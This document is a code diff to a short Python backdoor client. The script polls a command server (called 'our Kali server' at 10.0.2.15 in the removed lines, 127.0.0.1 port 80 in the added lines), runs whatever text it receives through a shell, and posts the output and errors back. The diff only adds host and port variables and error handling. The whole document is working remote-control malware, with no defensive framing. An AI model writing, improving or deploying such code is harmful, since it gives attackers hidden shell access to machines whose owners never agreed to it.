@@ -2,19 +2,31 @@ import requests
 import subprocess
 import time
 
-while True:
-    req = requests.get('http://10.0.2.15')  # Send GET request to our Kali server
-    command = req.text  # Store the received txt into the command variable
+HOST_NAME = '127.0.0.1'
+PORT_NUMBER = 80
 
-    if 'terminate' in command:
-        break
-    else:
-        try:
-            CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-            output, error = CMD.communicate()
-            post_response = requests.post(url='http://10.0.2.15', data=output.decode('utf-8'))  # POST the result
-            post_response = requests.post(url='http://10.0.2.15', data=error.decode('utf-8'))  # or the error - if any -
-        except Exception as e:
-            post_response = requests.post(url='http://10.0.2.15', data=str(e))
+while True:
+    try:
+        req = requests.get(f'http://{HOST_NAME}:{PORT_NUMBER}')
+        req.raise_for_status()  # Check for errors in the HTTP request
+
+        command = req.text
+        if 'terminate' in command:
+            break
+
+        CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+        output, error = CMD.communicate()
+
+        post_response = requests.post(url=f'http://{HOST_NAME}:{PORT_NUMBER}', data=output.decode('utf-8'))
+        post_response.raise_for_status()  # Check for errors in the HTTP post
+
+        post_response = requests.post(url=f'http://{HOST_NAME}:{PORT_NUMBER}', data=error.decode('utf-8'))
+        post_response.raise_for_status()
+
+    except requests.exceptions.RequestException as e:
+        print(f"Error: {e}")
+
+    except Exception as e:
+        print(f"Exception: {e}")
 
     time.sleep(3)
